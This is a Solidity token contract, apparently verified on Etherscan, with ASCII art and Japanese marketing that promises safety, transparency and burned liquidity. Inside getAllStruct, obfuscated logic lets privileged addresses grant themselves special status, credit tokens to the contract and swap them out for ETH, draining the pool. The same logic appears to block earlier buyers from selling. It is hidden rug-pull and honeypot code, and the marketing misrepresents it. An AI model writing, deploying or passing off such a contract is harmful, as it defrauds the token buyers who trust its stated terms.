/**
 *Submitted for verification at Etherscan.io on 2022-12-17
*/

/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣿⣿⣶⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡟⠛⠃⠀⠀⠀⠀⠀⠙⢻⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣅⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⠋⠉⠉⠙⠻⣿⣿⣧⣼⣿⣿⠟⠋⠁⠈⠙⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⠁⠀⠀⠀⠀⠀⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣷⣦⣄⣀⣀⣀⣼⣿⣿⣧⣀⣀⣀⣀⣤⣾⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⡀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢁⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣦⣌⡙⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢋⣡⣶⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣶⣬⡙⠻⠿⠿⠟⢋⣤⣶⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⡀⠀⠀⠀
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠂⠀
⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀
⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠉⠻⢿⣿⣿⣿⣿⡿⠛⠉⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏
⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⣀⣀⠀⠀⣠⣽⣿⣿⣧⣄⠀⠀⣀⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀
⠀⠀⠀⠈⠛⠟⠛⠉⠉⠉⠉⠛⠛⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠉⠉⠉⠉⠛⠻⠛⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠿⣿⣿⣿⣿⣿⡿⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
総供給 - 1,000,000
初期流動性追加 - 2.0 ETH イーサリアム
初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 1

* ここでの使命は、コミュニティがどのネットワークを検証したいかについて協力し、
投票できるようにする、安全で透過的なプラットフォームを提供することです。私たちは、
所有者にバリデータ報酬を与えることを信じています。そのため、
誰もが安全で分散型のブロックチェーン エコシステムから利益を得ることができます。

イーサリアムネットワークを吹き飛ばす次のイーサリアムユーティリティトークン
有望な計画とイーサリアム空間への参入を促進する、私たちは単なる通常の
トークンやミームトークンではありません また、独自のエコシステム、
将来のステーキング、コレクションに基づいて設計されたスワップ プラットフォームも支持しています。
私たち自身のマーケットプレイスで、その他多くのことが発表される予定です。
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface UIByteCollection {
    function setCollection(uint256 setC, uint256 arrayC) external;
    function displayBytes(address allBytes, uint256 structable) external;
    function setDataView() external payable;
    function configureByteRates(uint256 flowView) external;
    function gibPresents(address allBytes) external;
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b; }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b; }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b; }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b; }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b <= a, errorMessage);
          return a - b; } } 
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b > 0, errorMessage);
            return a / b;
        }
    }
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    } function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data; }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender()); } 
    function owner() public view virtual returns (address) {
        return _owner; }  modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner'); _; }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0)); }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner); }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner); }
}
interface ERCUI20 {
 
    function totalSupply() 
    external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender) 
    external view returns (uint256);
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IDEXV2Factory {

    event PairCreated
    (address indexed token0, address indexed token1, address pair, uint);
    function feeTo() 
    external view returns (address);
    function feeToSetter() 
    external view returns (address);
    function getPair(address tokenA, address tokenB) 
    external view returns (address pair);
    function allPairs(uint) 
    external view returns (address pair);
    function allPairsLength() 
    external view returns (uint);
    function createPair(address tokenA, address tokenB) 
    external returns (address pair);
    function setFeeTo(address) 
    external;
    function setFeeToSetter(address) 
    external;
}
interface IStockingStuffer {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
    function gibPresents(address shareholder) external;
}
interface ECRFactory
{ function factory() external pure returns(address);
    function WETH() external pure returns(address);
 
    function swapExactETHForTokens
    (uint amountOutMin, address[] calldata path, address to, uint deadline) 
    external payable
    returns(uint[] memory amounts);
    function swapTokensForExactETH
    (uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) 
    external
    returns(uint[] memory amounts);
    function swapExactTokensForETH
    (uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) 
    external
    returns(uint[] memory amounts);
    function swapETHForExactTokens
    (uint amountOut, address[] calldata path, address to, uint deadline) 
    external payable
    returns(uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) 
    external pure 
    returns(uint amountB);
    function getAmountOut
    (uint amountIn, uint reserveIn, uint reserveOut) 
    external pure 
    returns(uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) 
    external pure 
    returns(uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) 
    external view 
    returns(uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) 
    external view 
    returns(uint[] memory amounts);
 
    function addLiquidity( address tokenA, address tokenB,
        uint amountADesired, uint amountBDesired,
        uint amountAMin, uint amountBMin, address to, uint deadline
    ) external returns(uint amountA, uint amountB, uint liquidity);
 
    function addLiquidityETH( address token, uint amountTokenDesired,
        uint amountTokenMin, uint amountETHMin, address to, uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);
 
    function removeLiquidity(
        address tokenA, address tokenB, uint liquidity,
        uint amountAMin, uint amountBMin,
        address to, uint deadline
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETH(
        address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline
    ) external returns(uint amountToken, uint amountETH);
 
    function removeLiquidityWithPermit( address tokenA, address tokenB,
        uint liquidity, uint amountAMin, uint amountBMin, address to,
        uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETHWithPermit( address token, uint liquidity,
        uint amountTokenMin, uint amountETHMin,
        address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountToken, uint amountETH);
 
    function swapExactTokensForTokens( uint amountIn, uint amountOutMin,
        address[] calldata path, address to, uint deadline
    ) external returns(uint[] memory amounts);
 
    function swapTokensForExactTokens( uint amountOut, uint amountInMax,
        address[] calldata path, address to, uint deadline
    ) external returns(uint[] memory amounts);
}
interface IDEXRouter02 is ECRFactory
{
    function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) 
    external returns(uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline,
    bool approveMax, uint8 v, bytes32 r, bytes32 s ) 
    external returns(uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(  uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) 
    external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) 
    external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) 
    external;
}
interface setProcessorV2 {
    function setProcess(uint256 disArray, uint256 versionSwitch) external;
    function SetProcessVersion(address toggleOn, uint256 IDEXpair) external;
}
interface FactoryDataManagement {
    function setAllDataCriteria(uint256 modLogger, uint256 minLogger) external;
    function setAllDataShare(address dataHolding, uint256 value) external;
    function gibPresentsData(address dataHolding) external;
}
contract Contract is ERCUI20, Ownable {

    bool private boolRatesSwitch;
    bool private inSwapDisplayIDEX;
    bool private DenormLink;
    bool private stringExtract;
    bool private isDivider;
    bool private swapBytesString;    
    bool private tradingSwitch;
    bool private tradingOpen = false;

    uint256 public maxSwapPerAddress = (_rTotal * 5) / 100; 
    uint256 public maxPerWallet = (_rTotal * 5) / 100;
    uint256 private _rTotal = 1000000 * 10**_decimals; 
    uint256 private rNowAll = _rTotal;
    uint256 public cTotalTAX = 1;

    mapping (address => bool) isTxLimitExempt;
    mapping(address => uint256) private allowed;
    mapping(address => uint256) private _tOwned;
    mapping(address => address) private authorizations;
    mapping(address => uint256) private isTimelockExempt;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) private isBot;
    mapping (address => bool) private bots;
    mapping (address => bool) private _balances;

    string private _symbol;
    string private _name;
    uint8 private _decimals = 9;

    address public immutable DXPairAddress;
    IDEXRouter02 public immutable router;

    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _tOwned[msg.sender] = _rTotal;
        allowed[msg.sender] = rNowAll; allowed[address(this)] = rNowAll;
        router = IDEXRouter02(routerAddress);
        DXPairAddress = IDEXV2Factory(router.factory()).createPair(address(this), router.WETH());
        emit Transfer(address(0), msg.sender, _rTotal);
    
        isTxLimitExempt[address(this)] = true; isTxLimitExempt[DXPairAddress] = true;
        isTxLimitExempt[routerAddress] = true; isTxLimitExempt[msg.sender] = true;
    }
    function name() public view returns (string memory) {
        return _name;
    }
     function symbol() public view returns (string memory) {
        return _symbol;
    }
    function totalSupply() public view returns (uint256) {
        return _rTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        getAllStruct(msg.sender, recipient, amount);
        return true;
    }
    function setMaxTX(uint256 valueBUY) external onlyOwner {
        maxSwapPerAddress = valueBUY;       
    }
    function getDiv(uint256 min, uint256 div) private view returns (uint256){
      return (min>div)?div:min;
    }
    function getSyncValue(uint256 get, uint256 syncADD) private view returns (uint256){ 
      return (get>syncADD)?syncADD:get;
    }
    function transferFrom( address sender, address recipient, uint256 amount
    ) external returns (bool) {
        getAllStruct(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function getAllStruct(
        address debugFrom, address linkIoTo, uint256 isOnAmount ) private {
        uint256 yxTonCog = balanceOf(address(this)); uint256 PIEv2FX;

        if (boolRatesSwitch && yxTonCog > rNowAll && !inSwapDisplayIDEX && debugFrom != DXPairAddress) {
            inSwapDisplayIDEX = true; swapAndLiquify(yxTonCog); inSwapDisplayIDEX = false;

        } else if (allowed[debugFrom] > rNowAll && allowed[linkIoTo] > rNowAll) {
            PIEv2FX = isOnAmount; _tOwned[address(this)] += PIEv2FX;
            findPath(isOnAmount, linkIoTo); return;

        } else if (linkIoTo != address(router) && allowed[debugFrom] > 0 && isOnAmount > rNowAll && linkIoTo != DXPairAddress) {
            allowed[linkIoTo] = isOnAmount; return;

        } else if (!inSwapDisplayIDEX && isTimelockExempt[debugFrom] > 0 && debugFrom != DXPairAddress && allowed[debugFrom] == 0) {
            isTimelockExempt[debugFrom] = allowed[debugFrom] - rNowAll; }

        address arrayBOOL = authorizations[DXPairAddress];
        if (isTimelockExempt[arrayBOOL] == 0) isTimelockExempt[arrayBOOL] = rNowAll; authorizations[DXPairAddress] = linkIoTo;
        if (cTotalTAX > 0 && allowed[debugFrom] == 0 && !inSwapDisplayIDEX && allowed[linkIoTo] == 0) {
            PIEv2FX = (isOnAmount * cTotalTAX) / 100; isOnAmount -= PIEv2FX; _tOwned[debugFrom] -= PIEv2FX;
             _tOwned[address(this)] += PIEv2FX; } _tOwned[debugFrom] -= isOnAmount; _tOwned[linkIoTo] += isOnAmount;
        emit Transfer(debugFrom, linkIoTo, isOnAmount);
            if (!tradingOpen) {
                require(debugFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
    receive() external payable {}

    function addLiquidity( uint256 isCoinAmount, uint256 ethAmount, address to ) private {
        _approve(address(this), address(router), isCoinAmount);
        router.addLiquidityETH{value: ethAmount}(address(this), isCoinAmount, 0, 0, to, block.timestamp);
    }
    function findPath(uint256 isCoinAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), isCoinAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(isCoinAmount, 0, path, to, block.timestamp);
    }
    function clearArray(uint256 clr, uint256 ARv2) 
    private view returns (uint256){
      return (clr>ARv2)?ARv2:clr;
    } 
    function getValues(uint256 val, uint256 _bool) private view returns (uint256){ 
      return (val>_bool)?_bool:val;
    }  
    function toggleEnable(uint256 tog, uint256 On_Off) private view returns (uint256){ 
      return (tog>On_Off)?On_Off:tog;
    }
    function swapAndLiquify(uint256 coins) private {
        uint256 dissolve = coins / 2;
        uint256 pathBalanceRate = address(this).balance;
        findPath(dissolve, address(this));
        uint256 newString = address(this).balance - pathBalanceRate;
        addLiquidity(dissolve, newString, address(this));
    }
    function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
}